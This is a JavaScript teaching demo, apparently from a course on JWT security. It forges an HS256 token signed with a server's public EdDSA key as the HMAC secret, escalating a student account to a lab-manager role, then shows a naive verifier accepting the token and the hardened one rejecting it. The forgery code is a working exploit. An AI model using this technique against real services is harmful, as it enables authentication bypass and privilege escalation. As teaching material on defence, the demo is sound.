// demo4/confusion.mjs — lesson 4.2, attack 2: algorithm confusion (RS/HS, CVE-2016-5431 family).
// The server verifies EdDSA with a PUBLIC key that is published in its JWKS — so it is NOT secret. A naive verifier
// that picks the algorithm from the token will, for an HS256 token, use that same public key as the HMAC SECRET.
// The attacker, who downloaded the public key, can therefore forge any token.
import { createHmac } from 'node:crypto';
import { b64urlJson, decodeJwt } from '../src/jwt/index.js';
import { JwtError } from '../src/jwt/verify.js';
import { verifyNaive } from './_naive.mjs';
import { makeIssuer } from './_util.mjs';

const { tokens, kp, kid } = makeIssuer();
const pem = kp.publicKey.export({ type: 'spki', format: 'pem' }); // the server's PUBLIC key — attacker reads it from JWKS

const claims = { ...decodeJwt(tokens.issue('usr_1', { role: 'STUDENT' })).payload, sub: 'usr_3', role: 'LAB_MANAGER' };
const header = b64urlJson({ alg: 'HS256', typ: 'JWT', kid });     // claim HS256 against an EdDSA kid
const input = `${header}.${b64urlJson(claims)}`;
const sig = createHmac('sha256', pem).update(input).digest('base64url'); // HMAC with the PUBLIC key as the secret
const forged = `${input}.${sig}`;

console.log('the server publishes an Ed25519 public key (not secret). The attacker signs HS256 with that PEM:\n');
console.log('a verifier that picks the algorithm from the token, keyed with the public key:');
try { const p = verifyNaive(forged, pem); console.log('  ACCEPTED → forged', p.sub, 'as', p.role, '— the public key became a shared secret'); }
catch (e) { console.log('  rejected:', e.message); }

console.log('\nLabFlow ID\'s verifier — kid ' + kid + ' is declared EdDSA, the header says HS256:');
try { tokens.verify(forged); console.log('  ACCEPTED (broken)'); }
catch (e) { console.log('  rejected →', e instanceof JwtError ? e.code : e.message); }
